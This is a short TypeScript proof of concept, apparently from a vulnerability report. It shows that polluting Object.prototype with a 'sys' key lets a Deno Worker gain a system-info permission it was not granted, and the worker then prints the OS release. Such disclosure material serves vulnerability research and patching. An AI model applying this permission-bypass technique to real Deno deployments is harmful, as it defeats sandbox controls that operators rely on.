// Create worker on the fly
Deno.writeTextFileSync(
  "./worker.ts",
  "console.log(await Deno.permissions.query({ name: 'sys' }));" +
  "console.log(Deno.osRelease());" +
  "Deno.exit(1);",
  { create: true },
);

// PoC
function pollute(key: string, value: any) {
  ((((Object as any).prototype as any)[key]) as any) = value;
}

pollute("sys", true);
new Worker(
  import.meta.resolve("./worker.ts"),
  { type: "module", deno: { permissions: {/*some object*/} } },
);
